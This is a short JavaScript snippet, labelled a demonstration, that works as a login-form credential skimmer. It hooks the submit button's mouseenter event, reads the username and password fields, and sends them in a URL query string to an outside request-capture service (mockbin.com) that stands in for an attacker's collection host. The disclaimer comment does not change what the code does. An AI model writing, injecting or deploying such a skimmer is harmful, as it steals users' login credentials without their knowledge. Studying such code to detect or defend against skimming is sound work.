// This code is for demonstration purposes, and under no circumstances it will be used for a real attack.

function start() {
    const subBtn = document.getElementById('sub-btn')

    const sendToMe = function (event) {
        const username = document.getElementById('user')?.value
        const password = document.getElementById('pass')?.value


        fetch(`https://mockbin.com/request?username=${username}&password=${password}`, {
            "headers": {
                "cookie": "foo=bar; bar=baz",
                "x-pretty-print": "2"
            }
        })
    }

    if(subBtn) {
        subBtn.addEventListener('mouseenter', sendToMe);
    }

    console.log('form attached')
}

start()


